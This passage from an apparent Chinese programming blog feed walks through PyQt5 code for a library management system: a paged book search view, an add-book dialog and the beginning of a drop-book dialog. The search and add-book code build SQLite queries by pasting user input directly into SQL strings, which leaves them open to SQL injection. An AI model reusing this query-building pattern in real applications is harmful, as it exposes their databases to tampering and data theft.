&#39;按出版社查询&#39;]</span><br><span class="line">        self.condisionComboBox.setFixedHeight(32)</span><br><span class="line">        self.condisionComboBox.setFont(font)</span><br><span class="line">        self.condisionComboBox.addItems(searchCondision)</span><br><span class="line"></span><br><span class="line">        self.Hlayout1.addWidget(self.searchEdit)</span><br><span class="line">        self.Hlayout1.addWidget(self.searchButton)</span><br><span class="line">        self.Hlayout1.addWidget(self.condisionComboBox)</span><br><span class="line"></span><br><span class="line">        # Hlayout2初始化</span><br><span class="line">        self.jumpToLabel &#x3D; QLabel(&quot;跳转到第&quot;)</span><br><span class="line">        self.pageEdit &#x3D; QLineEdit()</span><br><span class="line">        self.pageEdit.setFixedWidth(30)</span><br><span class="line">        s &#x3D; &quot;&#x2F;&quot; + str(self.totalPage) + &quot;页&quot;</span><br><span class="line">        self.pageLabel &#x3D; QLabel(s)</span><br><span class="line">        self.jumpToButton &#x3D; QPushButton(&quot;跳转&quot;)</span><br><span class="line">        self.prevButton &#x3D; QPushButton(&quot;前一页&quot;)</span><br><span class="line">        self.prevButton.setFixedWidth(60)</span><br><span class="line">        self.backButton &#x3D; QPushButton(&quot;后一页&quot;)</span><br><span class="line">        self.backButton.setFixedWidth(60)</span><br><span class="line"></span><br><span class="line">        Hlayout &#x3D; QHBoxLayout()</span><br><span class="line">        Hlayout.addWidget(self.jumpToLabel)</span><br><span class="line">        Hlayout.addWidget(self.pageEdit)</span><br><span class="line">        Hlayout.addWidget(self.pageLabel)</span><br><span class="line">        Hlayout.addWidget(self.jumpToButton)</span><br><span class="line">        Hlayout.addWidget(self.prevButton)</span><br><span class="line">        Hlayout.addWidget(self.backButton)</span><br><span class="line">        widget &#x3D; QWidget()</span><br><span class="line">        widget.setLayout(Hlayout)</span><br><span class="line">        widget.setFixedWidth(300)</span><br><span class="line">        self.Hlayout2.addWidget(widget)</span><br><span class="line"></span><br><span class="line">        # tableView</span><br><span class="line">        # 序号，书名，书号，作者，分类，出版社，出版时间，库存，剩余可借</span><br><span class="line">        self.db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        self.db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        self.db.open()</span><br><span class="line">        self.tableView &#x3D; QTableView()</span><br><span class="line">        self.tableView.horizontalHeader().setStretchLastSection(True)</span><br><span class="line">        self.tableView.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        self.tableView.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line">        self.queryModel &#x3D; QSqlQueryModel()</span><br><span class="line">        self.searchButtonClicked()</span><br><span class="line">        self.tableView.setModel(self.queryModel)</span><br><span class="line"></span><br><span class="line">        self.queryModel.setHeaderData(0, Qt.Horizontal, &quot;书名&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(1, Qt.Horizontal, &quot;书号&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(2, Qt.Horizontal, &quot;作者&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(3, Qt.Horizontal, &quot;分类&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(4, Qt.Horizontal, &quot;出版社&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(5, Qt.Horizontal, &quot;出版时间&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(6, Qt.Horizontal, &quot;库存&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(7, Qt.Horizontal, &quot;剩余可借&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(8, Qt.Horizontal, &quot;总借阅次数&quot;)</span><br><span class="line"></span><br><span class="line">        self.layout.addLayout(self.Hlayout1)</span><br><span class="line">        self.layout.addWidget(self.tableView)</span><br><span class="line">        self.layout.addLayout(self.Hlayout2)</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line">        self.searchButton.clicked.connect(self.searchButtonClicked)</span><br><span class="line">        self.prevButton.clicked.connect(self.prevButtonClicked)</span><br><span class="line">        self.backButton.clicked.connect(self.backButtonClicked)</span><br><span class="line">        self.jumpToButton.clicked.connect(self.jumpToButtonClicked)</span><br><span class="line">        self.searchEdit.returnPressed.connect(self.searchButtonClicked)</span><br><span class="line"></span><br><span class="line">    def setButtonStatus(self):</span><br><span class="line">        if(self.currentPage&#x3D;&#x3D;self.totalPage):</span><br><span class="line">            self.prevButton.setEnabled(True)</span><br><span class="line">            self.backButton.setEnabled(False)</span><br><span class="line">        if(self.currentPage&#x3D;&#x3D;1):</span><br><span class="line">            self.backButton.setEnabled(True)</span><br><span class="line">            self.prevButton.setEnabled(False)</span><br><span class="line">        if(self.currentPage&lt;self.totalPage and self.currentPage&gt;1):</span><br><span class="line">            self.prevButton.setEnabled(True)</span><br><span class="line">            self.backButton.setEnabled(True)</span><br><span class="line"></span><br><span class="line">    # 得到记录数</span><br><span class="line">    def getTotalRecordCount(self):</span><br><span class="line">        self.queryModel.setQuery(&quot;SELECT * FROM Book&quot;)</span><br><span class="line">        self.totalRecord &#x3D; self.queryModel.rowCount()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 得到总页数</span><br><span class="line">    def getPageCount(self):</span><br><span class="line">        self.getTotalRecordCount()</span><br><span class="line">        # 上取整</span><br><span class="line">        self.totalPage &#x3D; int((self.totalRecord + self.pageRecord - 1) &#x2F; self.pageRecord)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 分页记录查询</span><br><span class="line">    def recordQuery(self, index):</span><br><span class="line">        queryCondition &#x3D; &quot;&quot;</span><br><span class="line">        conditionChoice &#x3D; self.condisionComboBox.currentText()</span><br><span class="line">        if (conditionChoice &#x3D;&#x3D; &quot;按书名查询&quot;):</span><br><span class="line">            conditionChoice &#x3D; &#39;BookName&#39;</span><br><span class="line">        elif (conditionChoice &#x3D;&#x3D; &quot;按书号查询&quot;):</span><br><span class="line">            conditionChoice &#x3D; &#39;BookId&#39;</span><br><span class="line">        elif (conditionChoice &#x3D;&#x3D; &quot;按作者查询&quot;):</span><br><span class="line">            conditionChoice &#x3D; &#39;Auth&#39;</span><br><span class="line">        elif (conditionChoice &#x3D;&#x3D; &#39;按分类查询&#39;):</span><br><span class="line">            conditionChoice &#x3D; &#39;Category&#39;</span><br><span class="line">        else:</span><br><span class="line">            conditionChoice &#x3D; &#39;Publisher&#39;</span><br><span class="line"></span><br><span class="line">        if (self.searchEdit.text() &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            queryCondition &#x3D; &quot;select * from Book&quot;</span><br><span class="line">            self.queryModel.setQuery(queryCondition)</span><br><span class="line">            self.totalRecord &#x3D; self.queryModel.rowCount()</span><br><span class="line">            self.totalPage &#x3D; int((self.totalRecord + self.pageRecord - 1) &#x2F; self.pageRecord)</span><br><span class="line">            label &#x3D; &quot;&#x2F;&quot; + str(int(self.totalPage)) + &quot;页&quot;</span><br><span class="line">            self.pageLabel.setText(label)</span><br><span class="line">            queryCondition &#x3D; (&quot;select * from Book ORDER BY %s  limit %d,%d &quot; % (conditionChoice,index, self.pageRecord))</span><br><span class="line">            self.queryModel.setQuery(queryCondition)</span><br><span class="line">            self.setButtonStatus()</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        # 得到模糊查询条件</span><br><span class="line">        temp &#x3D; self.searchEdit.text()</span><br><span class="line">        s &#x3D; &#39;%&#39;</span><br><span class="line">        for i in range(0, len(temp)):</span><br><span class="line">            s &#x3D; s + temp[i] + &quot;%&quot;</span><br><span class="line">        queryCondition &#x3D; (&quot;SELECT * FROM Book WHERE %s LIKE &#39;%s&#39; ORDER BY %s &quot; % (</span><br><span class="line">            conditionChoice, s,conditionChoice))</span><br><span class="line">        self.queryModel.setQuery(queryCondition)</span><br><span class="line">        self.totalRecord &#x3D; self.queryModel.rowCount()</span><br><span class="line">        # 当查询无记录时的操作</span><br><span class="line">        if(self.totalRecord&#x3D;&#x3D;0):</span><br><span class="line">            print(QMessageBox.information(self,&quot;提醒&quot;,&quot;查询无记录&quot;,QMessageBox.Yes,QMessageBox.Yes))</span><br><span class="line">            queryCondition &#x3D; &quot;select * from Book&quot;</span><br><span class="line">            self.queryModel.setQuery(queryCondition)</span><br><span class="line">            self.totalRecord &#x3D; self.queryModel.rowCount()</span><br><span class="line">            self.totalPage &#x3D; int((self.totalRecord + self.pageRecord - 1) &#x2F; self.pageRecord)</span><br><span class="line">            label &#x3D; &quot;&#x2F;&quot; + str(int(self.totalPage)) + &quot;页&quot;</span><br><span class="line">            self.pageLabel.setText(label)</span><br><span class="line">            queryCondition &#x3D; (&quot;select * from Book ORDER BY %s  limit %d,%d &quot; % (conditionChoice,index, self.pageRecord))</span><br><span class="line">            self.queryModel.setQuery(queryCondition)</span><br><span class="line">            self.setButtonStatus()</span><br><span class="line">            return</span><br><span class="line">        self.totalPage &#x3D; int((self.totalRecord + self.pageRecord - 1) &#x2F; self.pageRecord)</span><br><span class="line">        label &#x3D; &quot;&#x2F;&quot; + str(int(self.totalPage)) + &quot;页&quot;</span><br><span class="line">        self.pageLabel.setText(label)</span><br><span class="line">        queryCondition &#x3D; (&quot;SELECT * FROM Book WHERE %s LIKE &#39;%s&#39; ORDER BY %s LIMIT %d,%d &quot; % (</span><br><span class="line">            conditionChoice, s, conditionChoice,index, self.pageRecord))</span><br><span class="line">        self.queryModel.setQuery(queryCondition)</span><br><span class="line">        self.setButtonStatus()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 点击查询</span><br><span class="line">    def searchButtonClicked(self):</span><br><span class="line">        self.currentPage &#x3D; 1</span><br><span class="line">        self.pageEdit.setText(str(self.currentPage))</span><br><span class="line">        self.getPageCount()</span><br><span class="line">        s &#x3D; &quot;&#x2F;&quot; + str(int(self.totalPage)) + &quot;页&quot;</span><br><span class="line">        self.pageLabel.setText(s)</span><br><span class="line">        index &#x3D; (self.currentPage - 1) * self.pageRecord</span><br><span class="line">        self.recordQuery(index)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 向前翻页</span><br><span class="line">    def prevButtonClicked(self):</span><br><span class="line">        self.currentPage -&#x3D; 1</span><br><span class="line">        if (self.currentPage &lt;&#x3D; 1):</span><br><span class="line">            self.currentPage &#x3D; 1</span><br><span class="line">        self.pageEdit.setText(str(self.currentPage))</span><br><span class="line">        index &#x3D; (self.currentPage - 1) * self.pageRecord</span><br><span class="line">        self.recordQuery(index)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 向后翻页</span><br><span class="line">    def backButtonClicked(self):</span><br><span class="line">        self.currentPage +&#x3D; 1</span><br><span class="line">        if (self.currentPage &gt;&#x3D; int(self.totalPage)):</span><br><span class="line">            self.currentPage &#x3D; int(self.totalPage)</span><br><span class="line">        self.pageEdit.setText(str(self.currentPage))</span><br><span class="line">        index &#x3D; (self.currentPage - 1) * self.pageRecord</span><br><span class="line">        self.recordQuery(index)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 点击跳转</span><br><span class="line">    def jumpToButtonClicked(self):</span><br><span class="line">        if (self.pageEdit.text().isdigit()):</span><br><span class="line">            self.currentPage &#x3D; int(self.pageEdit.text())</span><br><span class="line">            if (self.currentPage &gt; self.totalPage):</span><br><span class="line">                self.currentPage &#x3D; self.totalPage</span><br><span class="line">            if (self.currentPage &lt;&#x3D; 1):</span><br><span class="line">                self.currentPage &#x3D; 1</span><br><span class="line">        else:</span><br><span class="line">            self.currentPage &#x3D; 1</span><br><span class="line">        index &#x3D; (self.currentPage - 1) * self.pageRecord</span><br><span class="line">        self.pageEdit.setText(str(self.currentPage))</span><br><span class="line">        self.recordQuery(index)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; BookStorageViewer()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h2><span id="pdai-ma-fen-xi">代码分析</span><a href="#pdai-ma-fen-xi" class="header-anchor">#</a></h2><ul><li>主要使用了 Qt自带的<code>QTableView</code>和<code>QSqlQueryModel</code>实现了查询和展示结果</li><li>也有得到记录数，总页数，点击查询，跳转，前一页，后一页的函数，这些都很好看懂，同时还设置了按钮的可用性</li><li>分页记录查询函数是这里面最主要的一个函数，首先看查询种类 ，分别有判断为空 ，模糊查询，查询无果的处理</li><li>在跳转前有对输入数据的检测合法与否</li></ul><blockquote><p>这里还没有实现动态刷新，因为这个功能是用其他部件信号传输实现的</p></blockquote><h2><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h2><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8zx44e8j30iv0f2q3y.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8zxv2mdj30it0ergmh.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8zyau3bj30iv0ezgme.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（5）——添加/淘汰书籍对话框设计</title>
    <url>/65cd36fc.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析：</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>在图书管管理系统主页上，我们有添加和淘汰的功能 ，通过按钮弹出对话框进行添加和淘汰书籍，这里我们就来完成一下这两个功能。</p><a id="more"></a><h2><span id="ptian-jia-tu-shu-gong-neng">添加图书功能</span><a href="#ptian-jia-tu-shu-gong-neng" class="header-anchor">#</a></h2><blockquote><p>添加图书，需要管理员添加以下信息</p></blockquote><ul><li>书名</li><li>书号</li><li>作者名</li><li>分类（分类已经规定，只需要选择对应的种类就可以了）</li><li>出版社</li><li>出版日期</li><li>添加的数量</li></ul><h3><span id="ptian-jia-tu-shu-dui-hua-kuang-dai-ma">添加图书对话框代码</span><a href="#ptian-jia-tu-shu-dui-hua-kuang-dai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import time</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class addBookDialog(QDialog):</span><br><span class="line">    add_book_success_signal &#x3D; pyqtSignal()</span><br><span class="line"></span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(addBookDialog, self).__init__(parent)</span><br><span class="line">        self.setUpUI()</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;添加书籍&quot;)</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 书名，书号，作者，分类，添加数量.出版社,出版日期</span><br><span class="line">        # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类</span><br><span class="line">        BookCategory &#x3D; [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot;</span><br><span class="line">            , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;]</span><br><span class="line">        self.resize(300, 400)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        # Label控件</span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot;  添加书籍&quot;)</span><br><span class="line">        self.bookNameLabel &#x3D; QLabel(&quot;书    名:&quot;)</span><br><span class="line">        self.bookIdLabel &#x3D; QLabel(&quot;书    号:&quot;)</span><br><span class="line">        self.authNameLabel &#x3D; QLabel(&quot;作    者:&quot;)</span><br><span class="line">        self.categoryLabel &#x3D; QLabel(&quot;分    类:&quot;)</span><br><span class="line">        self.publisherLabel &#x3D; QLabel(&quot;出 版 社:&quot;)</span><br><span class="line">        self.publishDateLabel &#x3D; QLabel(&quot;出版日期:&quot;)</span><br><span class="line">        self.addNumLabel &#x3D; QLabel(&quot;数    量:&quot;)</span><br><span class="line"></span><br><span class="line">        # button控件</span><br><span class="line">        self.addBookButton &#x3D; QPushButton(&quot;添 加&quot;)</span><br><span class="line"></span><br><span class="line">        # lineEdit控件</span><br><span class="line">        self.bookNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.bookIdEdit &#x3D; QLineEdit()</span><br><span class="line">        self.authNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.categoryComboBox &#x3D; QComboBox()</span><br><span class="line">        self.categoryComboBox.addItems(BookCategory)</span><br><span class="line">        self.publisherEdit &#x3D; QLineEdit()</span><br><span class="line">        self.publishTime &#x3D; QDateTimeEdit()</span><br><span class="line">        self.publishTime.setDisplayFormat(&quot;yyyy-MM-dd&quot;)</span><br><span class="line">        # self.publishDateEdit &#x3D; QLineEdit()</span><br><span class="line">        self.addNumEdit &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setMaxLength(10)</span><br><span class="line">        self.bookIdEdit.setMaxLength(6)</span><br><span class="line">        self.authNameEdit.setMaxLength(10)</span><br><span class="line">        self.publisherEdit.setMaxLength(10)</span><br><span class="line">        self.addNumEdit.setMaxLength(12)</span><br><span class="line">        self.addNumEdit.setValidator(QIntValidator())</span><br><span class="line"></span><br><span class="line">        # 添加进formlayout</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.bookNameLabel, self.bookNameEdit)</span><br><span class="line">        self.layout.addRow(self.bookIdLabel, self.bookIdEdit)</span><br><span class="line">        self.layout.addRow(self.authNameLabel, self.authNameEdit)</span><br><span class="line">        self.layout.addRow(self.categoryLabel, self.categoryComboBox)</span><br><span class="line">        self.layout.addRow(self.publisherLabel, self.publisherEdit)</span><br><span class="line">        self.layout.addRow(self.publishDateLabel, self.publishTime)</span><br><span class="line">        self.layout.addRow(self.addNumLabel, self.addNumEdit)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.addBookButton)</span><br><span class="line"></span><br><span class="line">        # 设置字体</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        self.bookNameLabel.setFont(font)</span><br><span class="line">        self.bookIdLabel.setFont(font)</span><br><span class="line">        self.authNameLabel.setFont(font)</span><br><span class="line">        self.categoryLabel.setFont(font)</span><br><span class="line">        self.publisherLabel.setFont(font)</span><br><span class="line">        self.publishDateLabel.setFont(font)</span><br><span class="line">        self.addNumLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setFont(font)</span><br><span class="line">        self.bookIdEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setFont(font)</span><br><span class="line">        self.publisherEdit.setFont(font)</span><br><span class="line">        self.publishTime.setFont(font)</span><br><span class="line">        self.categoryComboBox.setFont(font)</span><br><span class="line">        self.addNumEdit.setFont(font)</span><br><span class="line"></span><br><span class="line">        # button设置</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.addBookButton.setFont(font)</span><br><span class="line">        self.addBookButton.setFixedHeight(32)</span><br><span class="line">        self.addBookButton.setFixedWidth(140)</span><br><span class="line"></span><br><span class="line">        # 设置间距</span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line"></span><br><span class="line">        self.addBookButton.clicked.connect(self.addBookButtonCicked)</span><br><span class="line"></span><br><span class="line">    def addBookButtonCicked(self):</span><br><span class="line">        bookName &#x3D; self.bookNameEdit.text()</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        authName &#x3D; self.authNameEdit.text()</span><br><span class="line">        bookCategory &#x3D; self.categoryComboBox.currentText()</span><br><span class="line">        publisher &#x3D; self.publisherEdit.text()</span><br><span class="line">        publishTime &#x3D; self.publishTime.text()</span><br><span class="line">        addBookNum &#x3D; self.addNumEdit.text()</span><br><span class="line">        if (</span><br><span class="line">                bookName &#x3D;&#x3D; &quot;&quot; or bookId &#x3D;&#x3D; &quot;&quot; or authName &#x3D;&#x3D; &quot;&quot; or bookCategory &#x3D;&#x3D; &quot;&quot; or publisher &#x3D;&#x3D; &quot;&quot; or publishTime &#x3D;&#x3D; &quot;&quot; or addBookNum &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;有字段为空，添加失败&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        else:</span><br><span class="line">            addBookNum &#x3D; int(addBookNum)</span><br><span class="line">            db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">            db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">            db.open()</span><br><span class="line">            query &#x3D; QSqlQuery()</span><br><span class="line">            # 如果已存在，则update Book表的现存量，剩余可借量，不存在，则insert Book表，同时insert buyordrop表</span><br><span class="line">            sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">            query.exec_(sql)</span><br><span class="line">            if (query.next()):</span><br><span class="line">                sql &#x3D; &quot;UPDATE Book SET NumStorage&#x3D;NumStorage+%d,NumCanBorrow&#x3D;NumCanBorrow+%d WHERE BookId&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                    addBookNum, addBookNum, bookId)</span><br><span class="line">            else:</span><br><span class="line">                sql &#x3D; &quot;INSERT INTO book VALUES (&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,%d,%d,0)&quot; % (</span><br><span class="line">                    bookName, bookId, authName, bookCategory, publisher, publishTime, addBookNum, addBookNum)</span><br><span class="line">            query.exec_(sql)</span><br><span class="line">            db.commit()</span><br><span class="line">            # 插入droporinsert表</span><br><span class="line">            timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">            sql &#x3D; &quot;INSERT INTO buyordrop VALUES (&#39;%s&#39;,&#39;%s&#39;,1,%d)&quot; % (bookId, timenow, addBookNum)</span><br><span class="line">            query.exec_(sql)</span><br><span class="line">            db.commit()</span><br><span class="line">            print(QMessageBox.information(self, &quot;提示&quot;, &quot;添加书籍成功!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            self.add_book_success_signal.emit()</span><br><span class="line">            self.close()</span><br><span class="line">            self.clearEdit()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def clearEdit(self):</span><br><span class="line">        self.bookNameEdit.clear()</span><br><span class="line">        self.bookIdEdit.clear()</span><br><span class="line">        self.authNameEdit.clear()</span><br><span class="line">        self.addNumEdit.clear()</span><br><span class="line">        self.publisherEdit.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; addBookDialog()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><p>对于分类，使用了 <code>QComboBox</code><br>对于时间，选择了<code>QDateTimeEdit</code>，并且规定了时间的格式<br>在<code>setUpUI</code>中可以看到，当点击<strong>添加图书</strong>按钮时<code>addBookButtonClicked</code>函数</p><h3><span id="paddbookbuttonclicked-han-shu-shi-xian-luo-ji">addBookButtonClicked函数实现逻辑</span><a href="#paddbookbuttonclicked-han-shu-shi-xian-luo-ji" class="header-anchor">#</a></h3><p>虽然我注释了，但是这里还是想重新写一下，逻辑如下</p><ul><li>如果存在有空值，警告</li><li>添加的书已存在，就直接加上本数</li><li>本来不存在，则开始插入数据</li></ul><h3><span id="pshi-xian-xiao-guo">实现效果:</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8v90r9pj308b0c1dfs.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8v9u8t2j308d0c2wek.jpg" alt="这里写图片描述"></p><h2><span id="ptao-tai-tu-shu-gong-neng">淘汰图书功能</span><a href="#ptao-tai-tu-shu-gong-neng" class="header-anchor">#</a></h2><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>从实现看与添加图书差不多，但是为了方便，我只允许管理员添加书本号，然后自动匹配到书籍信息填充，管理员只需再添加一个淘汰数量就行了</p><h3><span id="pdai-ma">代码</span><a href="#pdai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class dropBookDialog(QDialog):</span><br><span class="line">    drop_book_successful_signal&#x3D;pyqtSignal()</span><br><span class="line"></span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(dropBookDialog, self).__init__(parent)</span><br><span class="line">        self.setUpUI()</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;删除书籍&quot;)</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 书名，书号，作者，分类，添加数量.出版社,出版日期</span><br><span class="line">        # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类</span><br><span class="line">        BookCategory &#x3D; [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot;</span><br><span class="line">            , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;]</span><br><span class="line">        self.resize(300, 400)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        # Label控件</span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot;  淘汰书籍&quot;)</span><br><span class="line">        self.bookNameLabel &#x3D; QLabel(&quot;书    名:&quot;)</span><br><span class="line">        self.bookIdLabel &#x3D; QLabel(&quot;书    号:&quot;)</span><br><span class="line">        self.authNameLabel &#x3D; QLabel(&quot;作    者:&quot;)</span><br><span class="line">        self.categoryLabel &#x3D; QLabel(&quot;分    类:&quot;)</span><br><span class="line">        self.publisherLabel &#x3D; QLabel(&quot;出 版 社:&quot;)</span><br><span class="line">        self.publishDateLabel &#x3D; QLabel(&quot;出版日期:&quot;)</span><br><span class="line">        self.dropNumLabel &#x3D; QLabel(&quot;数    量:&quot;)</span><br><span class="line"></span><br><span class="line">        # button控件</span><br><span class="line">        self.dropBookButton &#x3D; QPushButton(&quot;淘 汰&quot;)</span><br><span class="line"></span><br><span class="line">        # lineEdit控件</span><br><span class="line">        self.bookNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.bookIdEdit &#x3D; QLineEdit()</span><br><span class="line">        self.authNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.categoryComboBox &#x3D; QComboBox()</span><br><span class="line">        self.categoryComboBox.addItems(BookCategory)</span><br><span class="line">        self.publisherEdit &#x3D; QLineEdit()</span><br><span class="line">        self.publishTime &#x3D; QLineEdit()</span><br><span class="line">        # self.publishDateEdit &#x3D; QLineEdit()</span><br><span class="line">        self.dropNumEdit &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setMaxLength(10)</span><br><span class="line">        self.bookIdEdit.setMaxLength(6)</span><br><span class="line">        self.authNameEdit.setMaxLength(10)</span><br><span class="line">        self.publisherEdit.setMaxLength(10)</span><br><span class="line">        self.dropNumEdit.setMaxLength(12)</span><br><span class="line">        self.dropNumEdit.setValidator(QIntValidator())</span><br><span class="line"></span><br><span class="line">        # 